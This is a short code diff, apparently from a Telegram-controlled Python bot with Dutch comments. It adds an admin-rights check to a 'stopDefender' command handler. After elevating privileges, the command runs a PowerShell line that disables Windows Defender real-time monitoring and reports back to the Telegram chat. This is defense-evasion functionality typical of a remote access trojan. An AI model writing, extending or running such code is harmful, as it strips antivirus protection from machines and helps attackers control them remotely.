@@ -90,7 +90,12 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     - run een command om te controleren als windows defender uit of aan staat
     - return de powershell output om te zien als de command wel of niet was uitgevoerd
     """
-    get_adminRights()
+    admin_check = check_adminRights()
+    if admin_check is not True:
+        await update.message.reply_text(admin_check)
+        get_adminRights()
+        return
+    
     run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows defender wordt uitgezet...")
     # meld dat Windows defender uit is
